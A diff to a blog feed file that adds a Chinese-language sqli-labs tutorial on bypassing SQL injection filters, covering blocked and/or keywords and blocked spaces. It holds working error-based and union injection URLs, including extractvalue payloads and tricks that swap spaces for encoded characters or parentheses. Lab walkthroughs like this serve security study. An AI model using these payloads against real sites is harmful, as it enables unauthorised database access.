@@ -6700,7 +6700,103 @@
 <p>同样利用报错注入</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-23&#x2F;?id&#x3D;1&#39; union select 1,(extractvalue(1,concat(&#39;:&#39;,(select database())))),&#39;</span><br></pre></td></tr></table></figure>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210801212513239.png" alt=""></p>
-<h4 id="绕过and-or字符过滤"><a href="#绕过and-or字符过滤" class="headerlink" title="绕过and-or字符过滤"></a>绕过and-or字符过滤</h4><h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><h4 id="绕过内联注释过滤"><a href="#绕过内联注释过滤" class="headerlink" title="绕过内联注释过滤"></a>绕过内联注释过滤</h4><h4 id="绕过函数过滤"><a href="#绕过函数过滤" class="headerlink" title="绕过函数过滤"></a>绕过函数过滤</h4>]]></content>
+<h4 id="绕过and-or字符过滤"><a href="#绕过and-or字符过滤" class="headerlink" title="绕过and-or字符过滤"></a>绕过and-or字符过滤</h4><p>测试地址:<a href="https://sqli.wmcoder.site/sqli-labs/Less-25/">https://sqli.wmcoder.site/sqli-labs/Less-25/</a></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802083141009.png" alt=""></p>
+<p>使用and</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>报错</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802084111675.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;1&#39; a and 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>发现a和1=1之间的and无法使用</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802084152310.png" alt=""></p>
+<p>同理or也无法使用,and和or被过滤</p>
+<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>尝试使用他们的大写格式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;1&#39; And 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>and的大写也无法使用</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802084405426.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;1&#39; Or 1 --+</span><br></pre></td></tr></table></figure>
+<p>同样被过滤</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802084538815.png" alt=""></p>
+<p>接下来尝试and和or的字符表示形式(&amp;&amp;和||)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;1&#39; &amp;&amp; 1 --+</span><br></pre></td></tr></table></figure>
+<p>失败</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802084653969.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;1&#39; || 1 --+</span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802084725199.png" alt=""></p>
+<p>可以利用||构造注入语句获取数据库名(结合报错注入),以获取数据库名为例</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; || extractvalue(1,concat(&#39;:&#39;,(select database()))) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802085051625.png" alt=""></p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>既然and和or被过滤,索性就不用呗,尝试使用union注入</p>
+<p>使用order by判断字段个数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; order by 3 --+</span><br></pre></td></tr></table></figure>
+<p>发现连order中的or都被过滤了</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802085447182.png" alt=""></p>
+<p>下面我们只能通过报错判断字段数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2 --+</span><br></pre></td></tr></table></figure>
+<p>两个字段报错</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802085655743.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802085735977.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,extractvalue(1,concat(&#39;:&#39;,(select database()))) --+</span><br></pre></td></tr></table></figure>
+<p>爆出数据库名</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802085810084.png" alt=""></p>
+<h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><p>测试地址:<a href="https://sqli.wmcoder.site/sqli-labs/Less-26/">https://sqli.wmcoder.site/sqli-labs/Less-26/</a></p>
+<p>本例中不仅过滤了空格还过滤了or,and以及注释等</p>
+<p>运用前面的知识,使用两个||构造注入语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-26&#x2F;?id&#x3D;1&#39;  || extractvalue(1,concat(&#39;:&#39;,(database()))) ||&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802091843887.png" alt=""></p>
+<p>对比上面语句,两者区别在于有没有使用select,但两者结果却相差很多</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-26&#x2F;?id&#x3D;1&#39;  || extractvalue(1,concat(&#39;:&#39;,(select database()))) ||&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802092108481.png" alt=""></p>
+<p>由于空格被过滤,select直接与database()连接在一起,所以报错.那么可以尝试使用其他字符代替空格</p>
+<p>可以代替空格的字符</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%09</td>
+<td>TAB键(水平)</td>
+</tr>
+<tr>
+<td>%0a</td>
+<td>新建一行</td>
+</tr>
+<tr>
+<td>%0c</td>
+<td>新的一页</td>
+</tr>
+<tr>
+<td>%0d</td>
+<td>return功能</td>
+</tr>
+<tr>
+<td>%0b</td>
+<td>TAB键(垂直)</td>
+</tr>
+<tr>
+<td>%a0</td>
+<td>空格</td>
+</tr>
+<tr>
+<td>/**/</td>
+<td>注释代替空格</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>注意：</strong>在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，Linux下无这个问题。</p>
+<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-26&#x2F;?id&#x3D;1&#39;  || extractvalue(1,concat(&#39;:&#39;,(select(version())))) ||&#39;</span><br></pre></td></tr></table></figure>
+<p>成功绕过</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210802093251555.png" alt=""></p>
+<h4 id="绕过内联注释过滤"><a href="#绕过内联注释过滤" class="headerlink" title="绕过内联注释过滤"></a>绕过内联注释过滤</h4><h4 id="绕过函数过滤"><a href="#绕过函数过滤" class="headerlink" title="绕过函数过滤"></a>绕过函数过滤</h4>]]></content>
       <categories>
         <category>Hack</category>
       </categories>
